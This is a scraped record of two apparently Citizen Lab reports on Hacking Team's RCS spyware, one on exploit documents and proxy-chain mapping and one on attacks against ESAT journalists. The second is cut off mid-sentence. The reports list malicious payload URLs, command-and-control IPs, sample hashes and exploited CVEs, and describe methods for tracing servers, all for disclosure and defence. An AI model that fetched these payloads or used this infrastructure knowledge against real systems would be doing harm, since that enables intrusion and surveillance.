attack can be found here.\nExploit 2\nFilename: veryimportant.doc\nHash: cd1fe50dbde70fb2f20d90b27a4cfe5676fa0e566a4ac14dc8dfd5c232b93933\nExploit: RTF file with DOC extension; CVE-2010-3333.\nTarget:  United Arab Emirates (UAE) human rights activist Ahmed Mansoor.\nPayload: Downloads a second stage38 from http://ar-24.com/0000000031/veryimportant.doc2.  The second stage downloads a Hacking Team RCS payload39 from http://ar-24.com/0000000031/veryimportant.doc3.\nExploit 3\nFilename: رسالة الكوفحي.doc40\nHash: c166aff46cadce2db642047cdca65234c32c6634d9ed822eeeb2a911178d6cc3\nExploit: Adobe Flash in Word document; Adobe Flash “Matrix3D” Integer Overflow.\nTarget: Unknown, but the spyware payload used a command-and-control server (hamas.sytes.net) linked to attacks believed to be conducted by the UAE government.\nPayload: Downloads a second stage from https://www.maile-s.com/yarab/stagedocJord.  The second stage downloads a SpyNet payload from https://www.maile-s.com/yarab/Win32.scr, and downloads bait content from https://www.maile-s.com/yarab/kofahi.doc.\nAnalysis: A public mailing list post41 credits Nicolas Joly of VUPEN for discovering this vulnerability. While VUPEN takes public credit for the discovery of this bug, it is also possible that the exploit used here was not written by VUPEN, but was instead independently discovered and/or weaponized by another party. Examination of the second stage of the payload shows it to be almost identical to veryimportant.doc2, simply using different URLs.\nExploit 4\nFilename: إماراتي مظلوم.doc\nHash: 8dbaa77c4db80da6b110e770851932c65c322153fd9edc1df23bd2312584bd94\nExploit: Adobe Flash in Word document; the exploit does not have a CVE number but appears to have been silently fixed in Adobe Flash 11.4.\nTarget: A human rights activist in the UAE, and a journalist in the UAE.\nPayload: Downloads a second stage from http://www.faddeha.com/stagedocuae1. Neither the second stage nor the payload were available for inspection.\nAnalysis: The metadata for this sample and for Exploit 3 are identical, suggesting that they were generated by the same actors.\nExploit 5\nFilename: Biglietto Visita.doc\nHash: c026ebfa3a191d4f27ee72f34fa0d97656113be368369f605e7845a30bc19f6a\nExploit: Adobe Flash in Word document; CVE-2013-5331. Was first seen used in November and December of 2013 and was a 0-day at that time.\nTarget: Unknown.\nPayload: Downloads a second stage from http://176.58.111.219/ipaddrs/shell. Neither the second stage nor the payload were available for inspection. Was uploaded to VirusTotal along with OSX and Windows samples of Hacking Team RCS.\nAnalysis: The metadata of the document is as follows:\n\nCDF V2 Document, Little Endian, Os: Windows, Version 5.1, Code page: 1252, Title: , Author: unknown, Template: Normal.dot, Last Saved By: unknown, Revision Number: 2, Name of Creating Application: Microsoft Office Word, Create Time/Date: Mon May 14 10:39:00 2012, Last Saved Time/Date: Mon May 14 10:39:00 2012, Number of Pages: 1, Number of Words: 7, Number of Characters: 41, Security: 0\n\nWhile the previous exploit documents used embedded GZIP compressed flash, this one uses LZMA compression. This compression option was added to the Flash file format recently and is a manual option in Flash Professional CS6. At the time of the attack, it appeared that few anti-virus products supported automated analysis of LZMA compressed flash, making this an effective technique for avoiding detection.\nExploit 6\nFilename: 1.doc\nHash: 519939a48ba9dbcc05abfeb4e7fbf9f9dda8c13b567ee6858decaadd09730770\nExploit: Adobe Flash in Word document; CVE-2013-0633.\nTarget: Unknown\nPayload: Downloads a second stage from http://62.109.31.96/0000000025/1.doc2. The second stage downloads a Hacking Team RCS payload from http://62.109.31.96/0000000025/0000000025.exe.\nAnalysis: The exploit uses LZMA compression. The metadata is almost identical to that of Exploit 5.\nExploit 7\nFilename: 1.doc\nHash: 1f9db646053a7bc6be1c8e8ef669079c9e9010306fa537ed555de2387952aa23\nExploit: Adobe Flash in Word document; CVE-2012-5054.\nTarget: Unknown\nPayload: Downloads a second stage from http://62.109.31.96/0000000025/1.doc2. The second stage downloads a Hacking Team RCS payload from http://62.109.31.96/0000000025/0000000025.exe.\nAnalysis: The exploit uses LZMA compression. The metadata is almost identical to that of Exploit 5.\nSummary\nExamination of the exploit document’s metadata reveals that exploits 1, 3, and 4 share identical creation and last modification times (2012-05-15T10:39:00Z). Meanwhile, exploits 5, 6, and 7 also share a common time (Mon May 14 10:39:00 2012).42 Creation time for all six of these exploit documents is 10:39:00, which suggests that all documents were created in the same manner. Additionally, all of the exploit documents described here download a second stage containing shellcode that then downloads and installs a third stage implant. We considered that the similarities in exploit payload and metadata were due to packaging by Hacking Team. However, only six of the seven exploits were used to deliver Hacking Team’s RCS. It appears that the exploit document builder is backdoor-independent, allowing customers to select their preferred spyware for post-exploitation.\nThe exploits discussed above are representative of exploits used to deliver commercial backdoors that we have observed from 2012 until now. They appear to have all been created by the same actor. It appears that Hacking Team partners with a professional exploit vendor that has been providing their customers with exploits for the past two years.\n \nIdentifying RCS Proxy Chains\nThis section outlines the methodology we applied to identify RCS servers, and trace proxy chains to their endpoints. We first describe how we fingerprinted and detected the servers, and then how we traced the proxy chains.\nFingerprinting RCS Servers\nWe began this research by devising six fingerprints43 for RCS servers by observing distinctive current and previous behavior (via historical scanning results) of servers listed in files detected as “DaVinci” or “FSBSpy” by at least one anti-virus engine on VirusTotal.44 Using our fingerprints, we searched a range of public, historical scanning results:45 the Internet Census,46 Critical.IO,47 Project Sonar,48 Shodan,49 and the ZMap SSL Scans.50 See Appendix A for our scan results.\nTwo of our fingerprints, A1 and A2, are based on the response of RCS servers when they are issued an HTTP GET request. Fingerprint A2 looks for a specific type of webpage redirection, and fingerprint A1 looks for impersonation of the popular Apache Web server.\n\n/HTTP\\/1.1 (404 NotFound)?(200 OK)?\\\\r\\\\n(Connection: close\\\\r\\\\n)?Content-Type: text\\/html\\\\r\\\\nContent-[lL]ength: [0-9]+\\\\r\\\\n(Connection: close\\\\r\\\\n)?(Server: Apache.*\\\\r\\\\n)?\\\\r\\\\n/ =~ banner and\r\n/Connection: close\\\\r\\\\n/ =~ banner and\r\n/<meta http-equiv=\\\\\\\"refresh\\\\\\\" content=\\\\\\\"0;url=http:\\/\\/[^\\\\]+\\\\\\\">/ =~ banner\n\nThe Ruby Boolean expression for Fingerprint A2 as formatted for the Critical.IO data51\nAlso, when issued an invalid HTTP request, many of the servers return a response with a distinctive typo52 matching an open source Ruby-based webserver written by a Hacking Team employee. Since the project is open source, we do not treat this condition as sufficient to identify an RCS server.\nThe four fingerprints, B1, B2, B3, and B4, match SSL certificates returned by RCS servers, which have several distinctive formats. Certificates matching B1 identify the server as an RCS server.\n\nA certificate matching fingerprint B1\nWhile examining SSL certificate results, we noticed that servers in several different countries were returning identical SSL certificates. We hypothesized that these servers were related to each other. As we describe in the next section, we found that servers with an identical SSL certificate were likely associated with a single government operator, and represented proxy chains that terminated in endpoints in a single country.\nIdentifying Endpoints and Mapping Proxy Chains\n\nVisual representation of a Mexico and Morocco circuit.

As a packet flows across the internet, it may be fragmented into smaller packets if it is too big to traverse a link between its source and destination all at once. Each packet fragment has the same IPID as the original packet, allowing the fragments to be reassembled into the original packet at the destination. The sender generally does not know which packets will be fragmented a priori, so must assign an IPID to almost every packet. Many older operating systems assign IPIDs to every packet using a global sequential method: the first packet sent to any destination has IPID 0, followed by 1, 2, and so on. Modern OS versions assign IPIDs randomly.\nFor our purposes, if a server has a global IPID, then we can use it as a counter for the number of packets that the server has sent to anyone. Furthermore, anyone can probe the server for this value by sending a request (e.g., TCP SYN55) to the server, and looking at the IPID value in the response (e.g., SYN/ACK). By probing the IPID value twice, once at time t1 and once at t2, one can see if the server sent any packets between t1 and t2.\nThe RCS servers we found with global IPIDs appeared to be located in countries that we saw less frequently in our scan results, whereas servers with SSL certificates appeared to be in countries that we saw more frequently. Based on this observation, we hypothesized that the servers returning SSL certificates were forwarding traffic to the servers with global IPIDs.\nIn order to establish whether a server, X, forwards traffic to another server with a global IPID, Y, we first waited until Y was idle (i.e., not sending any packets, as measured by repeated IPID probes). We then sent an IPID probe to Y, followed by a request (HTTP HEAD56) to X, followed by another IPID probe to Y. We looked for a gap (a difference greater than one) between the first and second IPID values; a gap would imply that Y responded to, and thus processed and received, our request to X. If this is the case, we say that X is a proxy for Y. We repeated the experiment more than ten times to be sure, checking in each case that Y was idle. We discovered that the four servers mentioned above were proxies for the following server:\n\n\n\n\n\n\n\n\n\nIP\nProvider\nCountry\nFirst Seen\n\n\n200.67.230.xxx\nUniNet\nMX\n2012-05-25\n\n\n\nThe next natural question was: is this server the endpoint? Or is it a proxy for another server?\nWe noticed that when we sent an HTTP HEAD or HTTP GET request to the MX server, the IPIDs of all IP packets returned by the MX server were consecutive. In other words, the MX server could not have been communicating with any other server by creating new packets, in responding to our request.57 However, MX could have been forwarding all existing packets of our request by rewriting destination addresses (like Network Address Translation).58 This would not induce the creation of any new packets, so it would be consistent with observed consecutive IPIDs. However, this type of forwarding would still be measurable in latency (round trip time) differences between the server in question and neighbouring servers not related to the spyware. In order to determine whether this was the case, we compared the latency of the MX server (measured using hping in both TCP and ICMP modes) with neighbouring servers in the IP space.  If the latency of the MX server was higher than neighbouring servers, it could indicate that the MX server was a proxy as opposed to an endpoint.  We found the latency to be identical to neighbouring servers. Thus, based on these two tests, we concluded that MX is an endpoint. To summarize, we used the following test to determine whether a server was an endpoint:\n\nDetermine whether the server has a global IPID. If not, the test will not work.\nWait for the server to be idle. If the server is not idle, the test will not work.\nIssue an HTTP GET request to the server, and look at the IPIDs of all packets returned by the server in response (we used tcpdump). If the IPIDs returned are not consecutive, then the server may not be an endpoint.\nCompare the latency of the server (ICMP and TCP RTTs) with surrounding servers.  If there is a difference, then the server may not be an endpoint.\n\nRecall that so far, we have established that all four servers are proxies for MX, and MX is an endpoint. The next natural question was about the topology of the forwarding. Is each server directly forwarding traffic to MX, or are the servers arranged in a proxy chain where one server forwards to the next server, etc., and eventually one of the servers forwards to MX? In order to determine this, we computed the circuit latency, an observer-independent measure of the latency required for a given server to relay a request to MX and receive a response.59\n\n\n\n\n\n\n\n\nIP\nCountry\nCircuit Latency\n\n\n14.136.236.147\nHK\n1584.51ms\n\n\n50.116.32.138\nUS\n1115.06ms\n\n\n31.192.228.60\nNL\n865.25ms\n\n\n176.58.102.218\nUK\n834.25ms\n\n\n200.67.230.2\nMX\n65.05ms\n\n\n\nWhile the latencies support the hypothesis that the servers are arranged in a proxy chain, it is also possible that we failed to detect other servers that are part of this group. In this case, the topology may be very different than what we have hypothesized.\n \nRCS Samples\nAlong with the scanning and fingerprinting of RCS servers previously described, we have also been able to identify likely government users by analyzing “bait content” associated with Windows and OS X RCS samples found in the wild.\nItaly\nItaly, the home country of Hacking Team, is one of the most prolific users of RCS. We identified several endpoints operated by Telecom Italia, but also Fastweb Network Administration Staff and C.S.H. & M.P.S. S.r.l. Interestingly, C.S.H. & M.P.S. S.r.l. was apparently involved in 2011 in the surveillance and arrest of Luigi Bisignani, an Italian ex-journalist allegedly deeply involved in secretly influencing Italian politics.60 We also observed numerous RCS samples (see Appendix B) that can be attributed to Italy, for which the context and targets are currently unknown. One of the most recent cases involved a document called Biglietto Visita.doc (Italian for “business card”) embedding a Flash 0-day exploit (see Exploit 5 in the Target Exploitation section above). The document was uploaded from Italy along with Windows and OSX versions of the RCS spyware.\nOman\nWe identified an RCS sample uploaded to VirusTotal from Oman61 that contained a bait document about Omani poetry, purportedly authored by Dr. Mohammed Mahrooqi at the University of Nizwa in Oman.\nPanama\nWe identified a server in Italy, 93.95.219.97, which was associated with two domain names, noticiaspty.com and blackberry-upgrade.com we believe were used for attacks in Panama. According to our scans, the IP was apparently last active around 9 September 2013.62 A Google search for the noticiaspty.com domain name reveals links to “.jad” files (BlackBerry applications) sent publicly via Twitter.\n\nTwo links to BlackBerry applications from @teresa_var.63,64\nWe also searched Topsy and found a deleted tweet that also links to a .jad file on this website.65 The Tweet contains a link to a BlackBerry application that is purportedly a leaked telephone recording of prominent lawyer Zulay Rodriguez.\nThe intended targets are as yet unclear, however almost all the Twitter users followed by and following @teresa_var are Panamanian politicians, many belonging to the Democratic Revolutionary Party (PRD).66 The tweets were all sent in December 2011.\nOther Samples\nWe found many other samples of RCS in the wild. Using the results of our mapping of RCS proxy chains, we managed to attribute samples to countries including: Egypt, Hungary, Italy, Kazakhstan, South Korea, Morocco, Saudi Arabia, Turkey and Uzbekistan.  See Appendix B for sample hashes.\n \nConclusion\nHacking Team has made a number of statements that seem intended to reassure the public, as well as potential regulators, that they conduct effective due diligence and self-regulation regarding their clients, and the human rights impact of their products. They also market their RCS product as untraceable. Our research suggests that both of these claims ring hollow.\nHacking Team says:\nWe have established an outside panel of technical experts and legal advisors, unique in our industry, that reviews potential sales. This panel reports directly to the board of directors regarding proposed sales.\nFirst, with respect to human rights, we have encountered a number of cases where bait content and other material are suggestive of targeting for political advantage, rather than legitimate law enforcement operations. Moreover, in an earlier post in this series, we identified the targeting of a US-based news organization. In other cases, however, the material did appear to be indicative of possible criminal investigations.67 Similarly, we have also found Hacking Team endpoints in regimes with both high and very low rankings in governance, rule of law, and freedom of expression.\nWe find it reasonable to conclude that some uses of this hacking suite are legally-sanctioned, properly overseen criminal investigations conducted under due process and rule-of-law. It is equally reasonable, however, to conclude that some uses are abusive, partisan, or unaccountable. Our findings of the global proliferation of Hacking Team belies their claims of high-quality due diligence. While they claim to rely on an outside panel for guidance on potential sales, little information is available about its members, processes, or the grounds under which a sale might be rejected.\nWith respect to its secrecy; despite marketing by Hacking Team that promises secrecy, as well as clear efforts at obfuscation, we have also shown once more that commercial trojan manufacturers may be guilty of hype when they make claims like “stealth” and “untraceable.” We think it unlikely that the purchasing officers of client countries were warned that their use of these tools could be exposed by non-nation-state researchers.\nOur report also highlights a professional alignment between exploit sellers and companies that sell surveillance trojans. While these actors are natural business partners, the conclusion we draw is that the marketplace for exploits and surveillance software, despite the opacity and competitiveness for government contracts, can also be cozy, with vendors regularly working together to sell products and solutions to clients. While this collaboration may offer a one-stop-shop experience for purchasers, it also helps tie vendors, campaigns, companies, and countries back together when investigated.\nIn conclusion, the combination of global proliferation, as well as dubious promises about “stealth” features points to the dangers—to many stakeholders—of an unregulated marketplace defined by lack of transparency and accountability.\n \nAcknowledgements\nThanks to Bernhard Amann, Collin D Anderson, Zakir Durumeric, Drew Hintz, Ralph Holz, Shane Huntley, Andrew Lyons, Vern Paxson, Mark Schloesser, and Nicholas Weaver.\nFootnotes\n1 http://hackingteam.it/index.php/customer-policy\n2 http://slate.me/1eSTeUF\n3 https://citizenlab.org/2012/10/backdoors-are-forever-hacking-team-and-the-targeting-of-dissent/\n4 https://citizenlab.org/2014/02/hacking-team-targeting-ethiopian-journalists/\n5 The countries are Azerbaijan, Ethiopia, Kazakhstan, Nigeria, Oman, Saudi Arabia, Sudan, UAE, and Uzbekistan.

It has long been suspected that FSBSpy is a first stage dropper used to verify an infection before, possibly manually, issuing the deployment of the final and more full-featured RCS, with which it shares multiple portions of code. Our scan results confirm a strong link between FSBSpy and RCS — we observed no differences between these servers, and even identified server groups used by both RCS samples and FSBSpy samples. Thus, in this post, we treat FSBSpy as an RCS product.\n45 We also contacted a team at TU Munich (https://pki.net.in.tum.de/), who searched their private scanning results for us; an interested reader could reproduce all of our server findings without access to this data.\n46 We searched the following service probes: 80-TCP_crossdomainxml, 80-TCP_FourOhFourRequest, 80-TCP_GetRequest, 80-TCP-HTTPOptions, 80-TCP-RTSPRequest, 443-TCP-SSL23SessionReq, 443-TCP-SSLSessionReq. Data is available at http://internetcensus2012.bitbucket.org/.\n47 https://scans.io/study/sonar.cio\n48 We searched the IPv4 SSL certificate scans from 9/10/2013 to 2/10/2014 (data available at https://scans.io/study/sonar.http) and the HTTP GET Port 80 scans from 10/29/2013 to 01/30/2014 (data available at https://scans.io/study/sonar.ssl.\n49 http://www.shodanhq.com/\n50 https://scans.io/study/umich-https\n51 In words, A2 checks for a response that contains a distinctive header, and also redirects to another website. The most common redirect we observed was http://www.google.com/, but we also identified other redirects, including two redirects to http://www.blackberry.com/btsc/kb18327, a page describing vulnerabilities in the BlackBerry PDF distiller (CVE-2009-2643), which could allow an attacker to execute arbitrary code via a malicious PDF file.\n52 The typo was “HTTP1/1 400 Bad request.” The typo was corrected in version 0.1.7.\n53 We observed too many IPs in this range to list here. It appears that the endpoint in this case has a dynamic IP address. All IP addresses that we identified in Poland appear to be endpoints of the same proxy chain.\n54 http://en.wikipedia.org/wiki/Idle_scan\n55 We sent TCP SYNs using the hping utility.\n56 We sent HTTP requests using the httping utility. We used HTTP requests to induce traffic, because Hacking Team’s RCS uses HTTP as its communication protocol.\n57 Also, the consecutive IPIDs told us that all packets were communicating with a single IP protocol stack (i.e., it was not the case that some packets were being handled by one server, and some were being forwarded to another server). In particular, it was not the case that one server accepted the TCP connection, and then forwarded packets on the established TCP connection to another server.\n58 http://en.wikipedia.org/wiki/Network_address_translation\n59 We sent HTTP HEAD requests to each of the five servers (including MX) using the httping utility. In split mode (-S), httping returns a value for the latency representing the round trip time to the server, plus the time taken by the server to forward to MX, and receive a response from MX. We obtain the circuit latency by subtracting from this value the round trip time to the server. We measured circuit latencies from three separate datacenters (London, Atlanta, Dallas). We measured the minimum time, as well as the average round trip time, and subtracted the latter from the former. We took 20 measurements of each, from each datacenter. We picked the minimum difference from across the 3 datacenters for each of the five IPs.\n60 http://www.tomshw.it/cont/news/bisignani-usava-un-trojan-spia-per-intercettare/32498/1.html\n61 209a986d8e17d361424dc11ffc69511b\n62 The Internet Archive recorded the contents of noticiaspty.com on 14 June 2013, which is consistent with one of our scanning fingerprints: https://web.archive.org/web/20130614133421/http://noticiaspty.com/.\n63 Available on Twitter and WebCitation.\n64 Available on Twitter and WebCitation.\n65 http://topsy.com/trackback?url=http%3A%2F%2Fwww.noticiaspty.com%2Fzulay_rodriguez.jad\n66 http://en.wikipedia.org/wiki/Democratic_Revolutionary_Party\n67 For example, we found two samples that communicated with a Saudi Arabian endpoint that had financially-themed bait content, suggesting possible anti-money laundering operations.\n\n\n\n\n\n\t\t\t\t\n\t\t\t",

    "text": "\n\t\t\t\t Download PDF I Read on ISSUU\nAuthors: Bill Marczak, Claudio Guarnieri, Morgan Marquis-Boire, and John Scott-Railton.\nThis post is the first in a series of posts that focus on the global proliferation and use of Hacking Team’s RCS spyware, which is sold exclusively to governments.\nRead the report’s coverage in the Washington Post and watch PostTV’s video.\nSee the report on Washington Post’s front page. [pdf]\nRead the second report in the series, “Mapping Hacking Team’s “Untraceable” Spyware“.\nRead the third report in the series, “Hacking Team’s US Nexus.”\n \nSummary\n\nEthiopian Satellite Television Service1 (ESAT) is an independent satellite television, radio, and online news media outlet run by members of the Ethiopian diaspora. The service has operations in Alexandria, Virginia, as well as several other countries.2  ESAT’s broadcasts are frequently critical of the Ethiopian Government. Available in Ethiopia and around the world, ESAT has been subjected to jamming from within Ethiopia several times in the past few years.3 A recent documentary shown on Ethiopian state media warned opposition parties against participating in ESAT programming.4\n\n\nIn the space of two hours on 20 December 2013, an attacker made three separate attempts to target two ESAT employees with sophisticated computer spyware, designed to steal files and passwords, and intercept Skype calls and instant messages. The spyware communicated with an IP address belonging to Ariave Satcom, a satellite provider that services Africa, Europe, and Asia.5 In each case, the spyware appeared to be Remote Control System (RCS), sold exclusively to governments by Milan-based Hacking Team.6\n\n\nHacking Team states that they do not sell RCS to “repressive regimes”,7 and that RCS is not sold through “independent agents”.8 Hacking Team also says that all sales are reviewed by a board that includes outside engineers and lawyers. The board has veto power over any sale.9  Before authorizing a sale, the company states that it considers “credible government or non-government reports reflecting that a potential customer could use surveillance technologies to facilitate human rights abuses,” as well as “due process requirements” for surveillance.10\n\n\nThe Committee to Protect Journalists (CPJ) reports that Ethiopia jails more journalists than any other African country besides Eritrea, and says that the Ethiopian government has shut down more than seventy-five media outlets since 1993.11 CPJ statistics also show that seventy-nine journalists have been forced to flee Ethiopia due to threats and intimidation over the past decade, more than any other country in the world.12 A 2013 Human Rights Watch (HRW) report detailed ongoing torture at Ethiopia’s Maekelawi detention center, the first stop for arrested journalists and protests organizers. Former detainees described how they were “repeatedly slapped, kicked, punched, and beaten,” and hung from the ceiling by their wrists. Information extracted in confession has been used to obtain conviction at trial, and to compel former detainees to work with the government.13 HRW also indicated abuses committed by the army, including the use of torture and rape to compel information from villagers near the site of an attack on a farm.14 HRW noted “insufficient respect for … due process” in Ethiopia.15\n\n \nBackground\nHacking Team and Remote Control System (RCS)\nHacking Team, also known as HT S.r.l., is a Milan-based purveyor of “offensive technology” to governments around the world. One of their products, known as Remote Control System (RCS), is a trojan that is sold exclusively to intelligence and law enforcement agencies worldwide. Hacking Team’s website describes the product as “the solution” to monitor targets that are increasingly using encryption, or those located outside the borders of the government that wants to monitor them.16\nDescription of RCS in a 2011 official brochure.17\nRCS infects a target’s computer or mobile phone to intercept data before it is encrypted for transmission, and can also intercept data that is never transmitted. For example, it can copy files from a computer’s hard disk, and can also record Skype calls, e-mails, instant messages, and passwords typed into a Web browser.18 Furthermore, RCS can turn on a device’s webcam and microphone to spy on the user.19\nWhile Hacking Team claims to potential clients that RCS can be used for mass surveillance of “hundreds of thousands of targets,”20 public statements by Hacking Team emphasize RCS’s potential use as a targeted tool for fighting crime and terrorism.21\nHacking Team was first thrust into the public spotlight in 2012 when RCS was used against award-winning Moroccan media outlet Mamfakinch,22 and United Arab Emirates (UAE) human rights activist Ahmed Mansoor, who was pardoned23 after serving seven months in prison for signing an online pro-democracy petition.24 Mansoor was infected, his Gmail password was stolen, and his e-mails were downloaded.25 At the same time, RCS is apparently being used by foreign governments to target individuals on US soil.26,27\nEvidence of the use of RCS against journalists and activists led Reporters Without Borders to name Hacking Team as one of the five “Corporate Enemies of the Internet.”28 Hacking Team Senior Counsel Eric Rabe responded with a defense of his company’s sales practices, in which he stated that Hacking Team does not provide its products to “repressive” regimes.29\nOn the issue of repressive regimes, Hacking Team goes to great lengths to assure that their software is not sold to governments that are blacklisted by the EU, US, NATO, and similar international organizations, or to any “repressive” regime.\n“Repressive” is a subjective term that may be difficult to define. We instead look to a selection of publications that rank countries based on freedom and democracy using a methodology. For example, The Economist publishes a Democracy Index,30 which rates governments around the world on a spectrum from “full democracies” to “authoritarian regimes.” Reporters Without Borders also publishes a yearly Press Freedom Index, which ranks countries’ press freedom situations from “good” to “very serious.”31\n\nEthiopia and Ethiopian Satellite Television Service (ESAT)\nThe Economist ranks Ethiopia as an “authoritarian regime,” and Reporters Without Borders classifies it as a country that presents a “difficult situation” for journalists. Human Rights Watch calls Ethiopia’s press law “deeply flawed,” and notes that several award-winning journalists have been convicted under the law for exercising their right to freedom of expression, as part of a government crackdown on independent media.32\nJournalists jailed under the press law includes Eskinder Nega, who was convicted of terrorism in 2012 in a case following the publication of his column that criticized the government’s detention of journalists.33 Nega won the 2012 PEN America Freedom to Write Award, and was hailed by the group as of the “bravest and most admirable of writers, one who picked up his pen to write things that he knew would surely put him at grave risk.”34  Nega is currently serving an eighteen year sentence in prison, having “[fallen] victim to exactly the measures he was highlighting.”35 In a May 2013 letter from prison, he wrote, “I will live to see the light at the end of the tunnel. It may or may not be a long wait. Whichever way events may go, I shall persevere!”36\nESAT describes itself as “powered by broad-based collective of exiled journalists, human rights advocates, civic society leaders and members in the Diaspora.” Available in Ethiopia and around the world, ESAT’s television and radio signals have been subjected to jamming from within Ethiopia several times in the past few years.37\nPrevious research by the Citizen Lab found a version of the FinFisher government spyware that used a picture of members of Ethiopian opposition group Ginbot 7 as bait, indicating politically-motivated targeting. That spyware communicated with a command-and-control server in Ethiopia.38 \n \nFirst Targeting Attempt\nFirst, the ESATSTUDIO Skype account was targeted with spyware.  This account is used by ESAT for on-air interviews.  The individual operating the ESATSTUDIO account at the time was an ESAT employee in Belgium, responsible for managing ESAT’s satellite broadcasts.  An individual identified as “Yalfalkenu Meches” (Skype: yalfalkenu1) sent a file to ESATSTUDIO entitled “An Article for ESAT.rar.”  We use Skype logs provided by the targets to illustrate the attacks.\n This .rar file contained an .exe file disguised as a .pdf. The file used the Adobe PDF icon, and contained a large number of spaces between the name and extension, to prevent Windows from displaying the extension.\n   \nLeft: How the file was rendered in Windows; Right: Windows file properties dialog\nDespite the file’s name, “An Article for ESAT,” the file did not display any such article, or any other content, when opened.\n \nAnalysis and Link to Hacking Team RCS\nSummary\nThe file sent to ESAT appeared to be Hacking Team’s RCS spyware for the following two reasons:\n\nThe file communicated with a server that returned two SSL certificates. The second certificate was issued by “RCS Certification Authority” / “HT srl”, and was similar to SSL certificates returned by two other servers apparently owned by Hacking Team. The first certificate was similar to certificates returned by two other servers that appeared to be demonstration servers for Hacking Team’s RCS spyware. \n\n\nThe file matched a signature that we had previously developed for RCS spyware.\n\nDetailed Analysis\nThe hash of the file was:\n\nsha256:   4a53db7b98aa000aeaa72d6a44004ef9ed3b6c09dd04a3e6015b62d741de3437\r\nsha1:     b7438e699dd54f8b56fc779c1b8b08b1943d9892\r\nmd5:      53a9e1b59ff37cc2aeff0391cc546201\n\nShortly after opening the .exe file, it attempted to communicate with the server 46.4.69.25 on port 80.\n\ninetnum:        46.4.69.0 - 46.4.69.31\r\nnetname:        HETZNER-RZ14\r\ndescr:          Hetzner Online AG\r\ndescr:          Datacenter 14\r\ncountry:        DE\n\nWe probed the server and noticed that it returned two self-signed SSL certificates:39\n\n\n\n\n\n\n\n\nIssuer\nSubject\nFingerprint\n\n\n/CN=default\n/CN=server\na7c0eacd845a7a433eca76f7d42fc3fedf1bde3c\n\n\n/CN=RCS Certification Authority /O=HT srl\n/CN=RCS Certification Authority /O=HT srl\n6500c243015a6ecc59f1272fec38eb0065d22063\n\n\n\nThe second certificate is issued by “RCS Certification Authority” / “HT srl”.  Hacking Team refers to their spyware as “RCS,” and identifies itself as “HT S.r.l.” on its website: \nTo confirm our hypothesis that these certificates were associated with Hacking Team, we searched historical SSL certificate data released by the Internet Census40 (443-TCP_SSLSessionReq) and by the University of Michigan’s zmap project.41 We found two servers returning the “RCS Certification Authority” / “HT srl” certificate that were in the following range:\n\ninetnum:        93.62.139.32 - 93.62.139.47\r\nnetname:        FASTWEB-HT\r\ndescr:          HT public subnet\r\ncountry:        IT\nperson:         GIANCARLO RUSSO\r\naddress:        VIA DELLA MOSCOVA 13\r\naddress:        MILANO MI\r\naddress:        IT\r\nphone:          +39 0229060603\n\nThe address and phone number on the range matches those on Hacking Team’s website. A Giancarlo Russo is listed as the Chief Operating Officer of Hacking Team on LinkedIn.42 Thus, we believe that Hacking Team controls this range of IP addresses.\nThe two servers in this range that returned similar certificates to the server in the ESAT spyware were:\n93.62.139.39 on 6/28/2012:\n\n\n\n\n\n\n\nIssuer\nSubject\nFingerprint\n\n\n/CN=RCS Certification Authority /O=HT srl\n/CN=rcs-castore\ndeee895bf1f68e97cb997d929e0f991ecec6ab29\n\n\n/CN=RCS Certification Authority /O=HT srl\n/CN=RCS Certification Authority /O=HT srl\n1e8e8806aa605544cda2bbb906b5d0cc7fb6fff7\n\n\n\n93.62.139.42 on 8/12/2012:\n\n\n\n\n\n\n\nIssuer\nSubject\nFingerprint\n\n\n/CN=RCS Certification Authority /O=HT srl\n/CN=rcs-polluce\n277fdf33df7baca54ce8336982db865d9f38f514\n\n\n/CN=RCS Certification Authority /O=HT srl\n/CN=RCS Certification Authority /O=HT srl\ne8d5f17d142768abe2ed835d5a61d99602ab082b\n\n\n\nBecause these IP addresses were registered to Hacking Team, we believe that the presence of a certificate apparently issued by “RCS Certification Authority” / “HT srl” is indicative of a server for Hacking Team’s RCS spyware. The Internet Census (443-TCP_SSLSessionReq) also recorded two instances of a server returning a certificate that matched the “default” / “server” certificate returned by the server in the ESAT spyware, along with an incomplete certificate for “rcs-demo.hackingteam.it.” This server was used by an RCS spyware sample found in VirusTotal.43 This certificate was returned by 168.144.159.167 on 12/14/2012, and by 94.199.243.39 on 12/14/2012. This is a further indication that the server in the spyware targeting ESAT is a Hacking Team RCS server.\nThe file itself also matched a signature we had previously developed for RCS spyware.\n \nSecond Attempt\nThe target did not open the first file (“An Article for ESAT.exe”), and complained to Yalfalkenu that the file was an .exe application. Yalfalkenu responded that he had received the file from a friend.\n\nYalfalkenu also said that he opened the .exe file and it “worked fine.” However, despite the file’s name, “An Article for ESAT,” the file did not display any such article, or any other content, when opened.\n\nYalfalkenu followed up by sending ESATSTUDIO a Word document.\n\n\nAnalysis and Link to Hacking Team RCS\nThe Word document was:\n\nsha256:   5bde4288c11f0701b54398ffeeddb4d6882d91b3e34bf76b1e250b8fc46be11d\r\nsha1:     057675f8dfda0f44a695ec18a5211ff4e68a1873\r\nmd5:      8df850088e2324d5c89615be32bd8a35\n\nAs with the previous file, opening this file did not result in any bait content being displayed. A user who opened the file saw a blank Word document, which quickly closed itself.\nThe document exploited a bug in Microsoft Windows (CVE-2012-015844) to run a program that downloaded and executed a file: 216.118.232.254/svchst.exe. An update to Windows available since April 2012 fixes this bug.45 The IP address 216.118.232.254 belongs to Ariave Satcom, a satellite provider that services Africa, Europe, and Asia.46\n\nPrivate Customer VSC-ARIAVE (NET-216-118-232-0-1) 216.118.232.0 - 216.118.232.255\r\nVSC Satellite Co. VSC-IPOWN1 (NET-216-118-224-0-1) 216.118.224.0 - 216.118.255.255\n\nWe downloaded svchst.exe:\n\nsha256:   bc68c8d86f2522fb4c58c6f482c5cacb284e5ef803d41a63142677855934d969\r\nsha1:     b341cc1c299c07624814f35a35a4d505e65d3b67\r\nmd5:      015c238d56b8657c0946ec45b131362a\n\nLike the first file, the file communicated with 46.4.69.25.  This file also matched our signature for RCS spyware. For the same reasons as the first file, this file appears to be Hacking Team RCS spyware.\n \nThird Attempt\nAn hour and a half later on the same day,47 Yalfalkenu targeted another ESAT employee, this time based in their Northern Virginia offices.\n\nThe document was:\n\nsha256:   8f9a6ae6aa56e12596d02c864998b4373a96d3f788195db3601b6e3ec54a99fb\r\nsha1:     c384ca066fe0145455f14976c0ecf8a817a30f86\r\nmd5:      daa5912d4ca0e4a143378947ef329374\n\nLike the second file, the document also exploited the CVE-2012-0158 bug, but had two main differences. First, the document actually displayed bait content—a copy of this article.48 Second, 